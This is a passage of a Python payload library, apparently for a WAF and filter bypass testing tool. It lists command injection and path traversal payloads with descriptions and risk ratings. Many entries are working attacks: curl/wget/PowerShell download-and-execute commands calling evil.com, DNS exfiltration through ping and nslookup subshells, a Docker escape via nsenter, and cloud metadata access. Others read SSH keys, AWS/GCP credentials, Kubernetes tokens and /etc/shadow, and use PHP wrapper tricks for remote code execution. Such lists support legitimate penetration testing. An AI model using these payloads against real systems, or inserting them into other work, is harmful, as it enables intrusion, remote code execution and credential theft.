            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # More bash evasion
        'cmd_var_split': {
            'payload': ';c=at;/bin/${c} /etc/passwd',
            'description': 'Variable split command assembly',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_paste_cmd': {
            'payload': ';l\\s',
            'description': 'Backslash in command to bypass filters',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_single_quote_bypass': {
            'payload': ";ca''t /etc/passwd",
            'description': 'Empty single quotes inside command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_double_quote_bypass': {
            'payload': ';ca""t /etc/passwd',
            'description': 'Empty double quotes inside command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_env_path_bypass': {
            'payload': ';$PATH/../bin/id',
            'description': 'PATH variable traversal bypass',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_printf_exec': {
            'payload': ";$(printf 'id')",
            'description': 'printf to build command string',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_read_bypass': {
            'payload': ';read x<<EOF\nid\nEOF\n$x',
            'description': 'Here-doc to inject command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_xxd_decode': {
            'payload': '; echo 6964 | xxd -r -p | bash',
            'description': 'xxd decode to execute hex command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'cmd_rev_bypass': {
            'payload': '; echo di | rev | bash',
            'description': 'Reverse string to bypass filter',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_tr_bypass': {
            'payload': "; echo 'je' | tr 'j' 'i' | bash",
            'description': 'tr to transform and execute command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_shell_variable': {
            'payload': ';a=id;$a',
            'description': 'Shell variable assignment and execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_ps_reflection': {
            'payload': '; powershell [Reflection.Assembly]::LoadWithPartialName("System.Net");$wc=New-Object System.Net.WebClient;$wc.DownloadFile("http://evil.com/shell.exe","C:\\Temp\\x.exe");Start-Process "C:\\Temp\\x.exe"',
            'description': 'PowerShell reflection-based download',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_curl_bash': {
            'payload': '; curl http://evil.com/sh | bash',
            'description': 'Download and execute script via curl-bash',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_awk_exec': {
            'payload': '; awk \'BEGIN{cmd="id";while((cmd | getline line)>0) print line}\'',
            'description': 'Command execution via awk',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_sed_exec': {
            'payload': '; sed -n \'1e id\' /dev/stdin',
            'description': 'Command execution via sed -e flag',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_lua_exec': {
            'payload': "; lua -e 'os.execute(\"id\")'",
            'description': 'Command execution via Lua',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_ruby_exec': {
            'payload': "; ruby -e 'exec(\"id\")'",
            'description': 'Command execution via Ruby',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_node_exec': {
            'payload': "; node -e 'require(\"child_process\").execSync(\"id\")'",
            'description': 'Command execution via Node.js',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_php_exec': {
            'payload': "; php -r 'system(\"id\");'",
            'description': 'Command execution via PHP CLI',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_windows_wmic': {
            'payload': '& wmic os get caption',
            'description': 'Windows WMIC for OS info',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_windows_reg_query': {
            'payload': '& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
            'description': 'Windows registry query',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_windows_tasklist': {
            'payload': '& tasklist /v',
            'description': 'Windows tasklist with details',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_ps_process_list': {
            'payload': '; powershell Get-Process',
            'description': 'PowerShell Get-Process listing',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_ping_dnsexfil': {
            'payload': "; ping -c 1 $(whoami).evil.com",
            'description': 'DNS exfiltration via ping subshell',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_nslookup_exfil': {
            'payload': '; nslookup $(cat /etc/hostname).evil.com',
            'description': 'DNS exfiltration via nslookup',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'critical'
        },
        'cmd_python2_exec': {
            'payload': "; python -c 'import os;os.system(\"id\")'",
            'description': 'Command execution via Python 2',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_bash_history': {
            'payload': '; cat ~/.bash_history',
            'description': 'Read user bash history',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_env_printout': {
            'payload': '; printenv',
            'description': 'Print all environment variables',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_linux_uname': {
            'payload': '; uname -a',
            'description': 'System kernel and OS information',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_linux_ifconfig': {
            'payload': '; ifconfig -a',
            'description': 'Network interface configuration',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_linux_netstat': {
            'payload': '; netstat -tulpn',
            'description': 'Open ports and listening services',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_linux_ps': {
            'payload': '; ps auxwww',
            'description': 'Full process listing',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_linux_whoami': {
            'payload': '; whoami',
            'description': 'Current user identification',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_win_powershell_iwr': {
            'payload': '& powershell Invoke-WebRequest -Uri http://evil.com/shell.exe -OutFile C:\\Temp\\s.exe; Start-Process C:\\Temp\\s.exe',
            'description': 'PowerShell download and execute',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_win_net_localgroup': {
            'payload': '& net localgroup administrators',
            'description': 'Windows local administrators group',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_curl_ssrf': {
            'payload': '; curl -s http://169.254.169.254/latest/meta-data/',
            'description': 'AWS metadata access via curl injection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'critical'
        },
        'cmd_bash_dollar_0': {
            'payload': '; echo $0',
            'description': 'Check current shell via $0',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'info'
        },
        'cmd_os_detect': {
            'payload': '; cat /etc/os-release 2>/dev/null || type win.ini 2>nul',
            'description': 'OS detection command',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'cmd_stager_wget': {
            'payload': '; wget -q -O- http://evil.com/sh.py | python3',
            'description': 'Download and execute Python payload',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IPS,
            'risk_level': 'critical'
        },
        'cmd_docker_escape': {
            'payload': '; nsenter --target 1 --mount --uts --ipc --net --pid -- bash',
            'description': 'Docker container escape via nsenter',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.ALL,
            'risk_level': 'critical'
        },
        'cmd_semicolons_spaces': {
            'payload': '  ;  id  ;  ',
            'description': 'Extra spaces around semicolons',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'cmd_heredoc_bypass': {
            'payload': ";<< 'EOF'\nid\nEOF",
            'description': 'Here document for space bypass',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_arithmetic_expand': {
            'payload': '; $((1+1))',
            'description': 'Arithmetic expansion in shell injection',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'low'
        },
        'cmd_bash_login_shell': {
            'payload': '; bash -l -c id',
            'description': 'Bash login shell command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.IDS,
            'risk_level': 'high'
        },
        'cmd_sh_alt': {
            'payload': '; /bin/sh -c id',
            'description': '/bin/sh alternative shell invocation',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'cmd_dash_c': {
            'payload': '; dash -c id',
            'description': 'dash shell command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_zsh_c': {
            'payload': '; zsh -c id',
            'description': 'zsh command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'cmd_tcsh_c': {
            'payload': '; tcsh -c id',
            'description': 'tcsh command execution',
            'category': PayloadCategory.COMMAND_INJECTION,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        }
    }
    
    # Path Traversal Bypass Payloads
    PATH_TRAVERSAL_PAYLOADS = {
        'path_basic': {
            'payload': '../../../etc/passwd',
            'description': 'Basic path traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_url_encoded': {
            'payload': '..%2F..%2F..%2Fetc%2Fpasswd',
            'description': 'URL encoded traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_double_encoded': {
            'payload': '..%252F..%252F..%252Fetc%252Fpasswd',
            'description': 'Double URL encoded',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_unicode': {
            'payload': '..\\u002f..\\u002f..\\u002fetc\\u002fpasswd',
            'description': 'Unicode encoded',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_backslash': {
            'payload': '..\\..\\..\\windows\\win.ini',
            'description': 'Backslash (Windows)',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_null_byte': {
            'payload': '../../../etc/passwd%00.jpg',
            'description': 'Null byte bypass',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_dot_slash': {
            'payload': '....//....//....//etc/passwd',
            'description': 'Extra dots and slashes',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_absolute': {
            'payload': '/etc/passwd',
            'description': 'Absolute path',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_windows_absolute': {
            'payload': 'C:\\windows\\win.ini',
            'description': 'Windows absolute path',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_overlong_utf8': {
            'payload': '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            'description': 'Overlong UTF-8 encoding',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Windows path traversal
        'path_win_basic': {
            'payload': '..\\..\\..\\windows\\win.ini',
            'description': 'Windows basic path traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_win_url_encoded': {
            'payload': '..%5C..%5C..%5Cwindows%5Cwin.ini',
            'description': 'Windows URL encoded traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_win_mixed_slash': {
            'payload': '../..\\../windows/win.ini',
            'description': 'Mixed forward and back slashes',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_win_system32': {
            'payload': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'description': 'Windows system32 hosts file access',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_win_boot_ini': {
            'payload': '..\\..\\..\\boot.ini',
            'description': 'Windows boot.ini file access',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        # Double encoding
        'path_double_encoded': {
            'payload': '..%252F..%252F..%252Fetc%252Fpasswd',
            'description': 'Double URL encoded path traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_triple_encoded': {
            'payload': '..%25252F..%25252F..%25252Fetc%25252Fpasswd',
            'description': 'Triple URL encoded path traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_unicode_bypass': {
            'payload': '..%u2216..%u2216..%u2216etc%u2216passwd',
            'description': 'Unicode / variant (U+2216)',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_unicode_2f_alt': {
            'payload': '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
            'description': 'Fullwidth solidus (U+FF0F) traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        # Null byte injection
        'path_null_byte': {
            'payload': '../../../etc/passwd%00.jpg',
            'description': 'Null byte to bypass extension check',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_null_byte_png': {
            'payload': '../../../etc/passwd\x00.png',
            'description': 'Raw null byte extension bypass',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Absolute paths
        'path_absolute_linux': {
            'payload': '/etc/passwd',
            'description': 'Absolute path direct file access',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_absolute_win': {
            'payload': 'C:\\windows\\win.ini',
            'description': 'Absolute Windows path',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Wrapper protocols
        'path_php_filter': {
            'payload': 'php://filter/convert.base64-encode/resource=/etc/passwd',
            'description': 'PHP filter wrapper for file read',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_php_filter_chain': {
            'payload': 'php://filter/read=string.rot13/resource=/etc/passwd',
            'description': 'PHP filter chain with rot13',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_php_input': {
            'payload': 'php://input',
            'description': 'PHP input stream wrapper',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'path_file_protocol': {
            'payload': 'file:///etc/passwd',
            'description': 'File protocol wrapper',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_expect_wrapper': {
            'payload': 'expect://id',
            'description': 'PHP expect wrapper for RCE',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        # UNC paths (Windows)
        'path_unc_basic': {
            'payload': '\\\\evil.com\\share\\test',
            'description': 'UNC path for network file access',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FIREWALL,
            'risk_level': 'high'
        },
        'path_unc_local': {
            'payload': '\\\\127.0.0.1\\c$\\windows\\win.ini',
            'description': 'UNC path to local admin share',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Dotdotslash filter bypass
        'path_dots_extra': {
            'payload': '....//....//....//etc/passwd',
            'description': 'Extra dots bypass for dotdot removal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_dots_slash_encoded': {
            'payload': '..././..././..././etc/passwd',
            'description': 'Slash bypass via partial URL encoding',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_dotslash_mixed': {
            'payload': '.././.././.././etc/passwd',
            'description': 'Mixed dot/slash combinations',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        # Zip Slip
        'path_zip_slip': {
            'payload': '../../../tmp/evil.sh',
            'description': 'Zip Slip path traversal in archive',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        # Sensitive files
        'path_ssh_private_key': {
            'payload': '../../../home/user/.ssh/id_rsa',
            'description': 'SSH private key extraction',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_ssh_authorized_keys': {
            'payload': '../../../home/user/.ssh/authorized_keys',
            'description': 'SSH authorized keys extraction',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_web_config': {
            'payload': '..\\..\\web.config',
            'description': 'ASP.NET web.config file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_wp_config': {
            'payload': '../../../wp-config.php',
            'description': 'WordPress configuration file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_etc_hosts': {
            'payload': '../../../etc/hosts',
            'description': '/etc/hosts file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_proc_self_environ': {
            'payload': '../../../proc/self/environ',
            'description': '/proc/self/environ traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_etc_shadow': {
            'payload': '../../../etc/shadow',
            'description': '/etc/shadow file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_dotenv': {
            'payload': '../../../.env',
            'description': '.env configuration file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_docker_env': {
            'payload': '../../../proc/1/environ',
            'description': 'Docker container environment via /proc',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_nginx_config': {
            'payload': '../../../etc/nginx/nginx.conf',
            'description': 'Nginx configuration file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_apache_config': {
            'payload': '../../../etc/apache2/apache2.conf',
            'description': 'Apache configuration file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_etc_crontab': {
            'payload': '../../../etc/crontab',
            'description': '/etc/crontab traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_etc_group': {
            'payload': '../../../etc/group',
            'description': '/etc/group file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_aws_credentials': {
            'payload': '../../../home/user/.aws/credentials',
            'description': 'AWS credentials file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_gcp_credentials': {
            'payload': '../../../home/user/.config/gcloud/credentials.db',
            'description': 'GCP credentials traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_kubernetes_token': {
            'payload': '../../../var/run/secrets/kubernetes.io/serviceaccount/token',
            'description': 'Kubernetes service account token',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_php_session': {
            'payload': '../../../var/lib/php/sessions/sess_TARGET_SESSION_ID',
            'description': 'PHP session file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_log_inject': {
            'payload': '../../../var/log/apache2/access.log',
            'description': 'Apache log file traversal for log poisoning',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_proc_net': {
            'payload': '../../../proc/net/tcp',
            'description': '/proc/net/tcp traversal for port discovery',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_proc_fd': {
            'payload': '../../../proc/self/fd/0',
            'description': '/proc/self/fd file descriptor traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_win_sam': {
            'payload': '..\\..\\..\\windows\\system32\\config\\SAM',
            'description': 'Windows SAM database file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_win_hosts': {
            'payload': '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'description': 'Windows hosts file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_iis_metabase': {
            'payload': '..\\..\\inetpub\\wwwroot\\web.config',
            'description': 'IIS web.config traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_aspnet_machinekey': {
            'payload': '..\\..\\..\\windows\\microsoft.net\\framework\\v4.0.30319\\config\\machine.config',
            'description': '.NET machine.config for machineKey',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_dotnet_web_config': {
            'payload': 'C:\\inetpub\\wwwroot\\web.config',
            'description': 'ASP.NET absolute path to web.config',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'path_url_scheme_bypass': {
            'payload': 'file%3A%2F%2F%2Fetc%2Fpasswd',
            'description': 'File scheme URL encoded traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_data_uri_lfi': {
            'payload': 'data:text/plain,<?php system($_GET[cmd]);?>',
            'description': 'Data URI for PHP LFI-to-RCE',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'path_zip_wrapper': {
            'payload': 'zip://uploads/archive.zip#shell.php',
            'description': 'PHP zip wrapper for LFI',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'path_phar_wrapper': {
            'payload': 'phar://uploads/file.phar/test',
            'description': 'PHP phar wrapper traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'critical'
        },
        'path_glob_bypass': {
            'payload': '/etc/pa??wd',
            'description': 'Glob pattern to find file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'medium'
        },
        'path_utf8_double_encoded': {
            'payload': '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            'description': 'Double percent-encoded traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_16bit_unicode': {
            'payload': '..%u2215..%u2215..%u2215etc%u2215passwd',
            'description': 'IIS %uXXXX Unicode traversal (U+2215)',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_env_home': {
            'payload': '$HOME/.ssh/id_rsa',
            'description': 'Environment variable $HOME expansion',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_iis_extension_bypass': {
            'payload': '../../../windows/win.ini%2500.asp',
            'description': 'IIS extension bypass via null byte',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.FILTER,
            'risk_level': 'high'
        },
        'path_git_config': {
            'payload': '../../../.git/config',
            'description': 'Git configuration file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'high'
        },
        'path_git_head': {
            'payload': '../../../.git/HEAD',
            'description': 'Git HEAD reference file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_docker_secrets': {
            'payload': '../../../run/secrets/',
            'description': 'Docker secrets directory traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_java_properties': {
            'payload': '../../../WEB-INF/classes/application.properties',
            'description': 'Java Spring application.properties traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_tomcat_users': {
            'payload': '../../../conf/tomcat-users.xml',
            'description': 'Tomcat users configuration traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_maven_settings': {
            'payload': '../../../.m2/settings.xml',
            'description': 'Maven settings.xml with credentials',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'critical'
        },
        'path_composer_json': {
            'payload': '../../../composer.json',
            'description': 'PHP Composer package manifest',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_node_package_json': {
            'payload': '../../../package.json',
            'description': 'Node.js package manifest',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'medium'
        },
        'path_requirements_txt': {
            'payload': '../../../requirements.txt',
            'description': 'Python requirements file',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
            'risk_level': 'low'
        },
        'path_etc_mysql': {
            'payload': '../../../etc/mysql/my.cnf',
            'description': 'MySQL configuration file traversal',
            'category': PayloadCategory.PATH_TRAVERSAL,
            'bypass_target': BypassTarget.WAF,
